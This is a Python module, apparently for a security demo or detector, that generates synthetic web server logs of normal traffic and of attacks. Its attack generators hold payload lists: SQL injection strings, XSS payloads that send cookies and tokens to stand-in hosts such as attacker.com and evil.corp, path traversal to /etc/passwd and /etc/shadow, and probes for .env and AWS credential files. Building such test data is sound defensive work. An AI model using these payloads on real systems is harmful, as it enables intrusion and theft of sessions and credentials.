import random
import time
from datetime import datetime
from typing import Dict, Any, List

NORMAL_IPS = [
    "192.168.1.105", "192.168.1.112", "10.0.0.45", "172.16.0.8",
    "203.0.113.19", "198.51.100.4", "192.168.1.150", "10.0.0.78"
]

ATTACKER_IPS = [
    "185.220.101.5", "45.146.164.110", "194.26.29.112", "91.240.118.242"
]

NORMAL_ENDPOINTS = [
    "/", "/index.html", "/products", "/about", "/contact",
    "/api/v1/items", "/api/v1/user/profile", "/static/css/main.css",
    "/static/js/bundle.js", "/images/logo.png", "/cart", "/checkout"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
]

class LogGenerator:
    """Generates synthetic normal web traffic and realistic cyber attack vectors for demonstration."""

    @staticmethod
    def generate_normal_log(ip: str = None) -> Dict[str, Any]:
        chosen_ip = ip or random.choice(NORMAL_IPS)
        endpoint = random.choice(NORMAL_ENDPOINTS)
        status = random.choices([200, 301, 302, 304, 404], weights=[85, 5, 5, 3, 2])[0]
        size = random.randint(300, 15000) if status == 200 else random.randint(100, 500)
        method = "POST" if endpoint in ["/cart", "/checkout"] and random.random() < 0.3 else "GET"
        
        return {
            "client_ip": chosen_ip,
            "timestamp": datetime.utcnow().isoformat(),
            "method": method,
            "endpoint": endpoint,
            "protocol": "HTTP/1.1",
            "status_code": status,
            "response_size": size,
            "referer": "https://example.com/",
            "user_agent": random.choice(USER_AGENTS),
            "raw_log": f'{chosen_ip} - - [{datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")}] "{method} {endpoint} HTTP/1.1" {status} {size} "-" "{random.choice(USER_AGENTS)}"'
        }

    @staticmethod
    def generate_sqli_attack(ip: str = None) -> Dict[str, Any]:
        attacker_ip = ip or random.choice(ATTACKER_IPS)
        sqli_payloads = [
            "/api/users?id=1' UNION SELECT username, password_hash FROM admin_users--",
            "/products?category=electronics' OR 1=1 --",
            "/search?q=phone'; DROP TABLE transactions;--",
            "/api/login?user=admin' OR 'a'='a'&pass=xyz",
            "/orders?id=50 AND (SELECT 1 FROM (SELECT SLEEP(5))A)"
        ]
        endpoint = random.choice(sqli_payloads)
        return {
            "client_ip": attacker_ip,
            "timestamp": datetime.utcnow().isoformat(),
            "method": "GET",
            "endpoint": endpoint,
            "protocol": "HTTP/1.1",
            "status_code": 500,
            "response_size": 1420,
            "referer": "-",
            "user_agent": "sqlmap/1.7#dev",
            "raw_log": f'{attacker_ip} - - [{datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {endpoint} HTTP/1.1" 500 1420 "-" "sqlmap/1.7#dev"'
        }

    @staticmethod
    def generate_xss_attack(ip: str = None) -> Dict[str, Any]:
        attacker_ip = ip or random.choice(ATTACKER_IPS)
        xss_payloads = [
            "/search?query=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
            "/comments?msg=<img src=x onerror=alert('Session_Hijacked')>",
            "/profile?name=<svg/onload=fetch('//evil.corp/?key='+localStorage.getItem('token'))>",
            "/index.php?redirect=javascript:alert(document.domain)"
        ]
        endpoint = random.choice(xss_payloads)
        return {
            "client_ip": attacker_ip,
            "timestamp": datetime.utcnow().isoformat(),
            "method": "GET",
            "endpoint": endpoint,
            "protocol": "HTTP/1.1",
            "status_code": 200,
            "response_size": 2840,
            "referer": "-",
            "user_agent": "Mozilla/5.0 (X11; Linux x86_64)",
            "raw_log": f'{attacker_ip} - - [{datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {endpoint} HTTP/1.1" 200 2840 "-" "Mozilla/5.0"'
        }

    @staticmethod
    def generate_path_traversal(ip: str = None) -> Dict[str, Any]:
        attacker_ip = ip or random.choice(ATTACKER_IPS)
        traversal_payloads = [
            "/static/../../../../etc/passwd",
            "/download?file=..%2f..%2f..%2fwindows/win.ini",
            "/view?doc=../../../../boot.ini",
            "/images/../../../etc/shadow"
        ]
        endpoint = random.choice(traversal_payloads)
        return {
            "client_ip": attacker_ip,
            "timestamp": datetime.utcnow().isoformat(),
            "method": "GET",
            "endpoint": endpoint,
            "protocol": "HTTP/1.1",
            "status_code": 403,
            "response_size": 256,
            "referer": "-",
            "user_agent": "Nikto/2.1.6",
            "raw_log": f'{attacker_ip} - - [{datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {endpoint} HTTP/1.1" 403 256 "-" "Nikto/2.1.6"'
        }

    @staticmethod
    def generate_recon_probe(ip: str = None) -> Dict[str, Any]:
        attacker_ip = ip or random.choice(ATTACKER_IPS)
        sensitive_paths = [
            "/.env", "/.git/config", "/wp-config.php",
            "/phpmyadmin/index.php", "/.aws/credentials", "/server-status"
        ]
        endpoint = random.choice(sensitive_paths)
        return {
            "client_ip": attacker_ip,
            "timestamp": datetime.utcnow().isoformat(),
            "method": "GET",
            "endpoint": endpoint,
            "protocol": "HTTP/1.1",
            "status_code": 404,
            "response_size": 180,
            "referer": "-",
            "user_agent": "Go-http-client/1.1",
            "raw_log": f'{attacker_ip} - - [{datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {endpoint} HTTP/1.1" 404 180 "-" "Go-http-client/1.1"'
        }

    @staticmethod
    def generate_brute_force_batch(ip: str = None, count: int = 6) -> List[Dict[str, Any]]:
        attacker_ip = ip or "185.220.101.5"
        batch = []
        for i in range(count):
            batch.append({
                "client_ip": attacker_ip,
                "timestamp": datetime.utcnow().isoformat(),
                "method": "POST",
                "endpoint": "/api/v1/auth/login",
                "protocol": "HTTP/1.1",
                "status_code": 401,
                "response_size": 145,
                "referer": "https://example.com/login",
                "user_agent": "Hydra/9.5",
                "raw_log": f'{attacker_ip} - - [{datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")}] "POST /api/v1/auth/login HTTP/1.1" 401 145 "https://example.com/login" "Hydra/9.5"'
            })
        return batch

    @staticmethod
    def generate_dos_batch(ip: str = None, count: int = 30) -> List[Dict[str, Any]]:
        attacker_ip = ip or "45.146.164.110"
        batch = []
        for i in range(count):
            batch.append({
                "client_ip": attacker_ip,
                "timestamp": datetime.utcnow().isoformat(),
                "method": "GET",
                "endpoint": "/api/heavy-data-export",
                "protocol": "HTTP/1.1",
                "status_code": 200,
                "response_size": 45000,
                "referer": "-",
                "user_agent": "LOIC/2.0",
                "raw_log": f'{attacker_ip} - - [{datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /api/heavy-data-export HTTP/1.1" 200 45000 "-" "LOIC/2.0"'
            })
        return batch
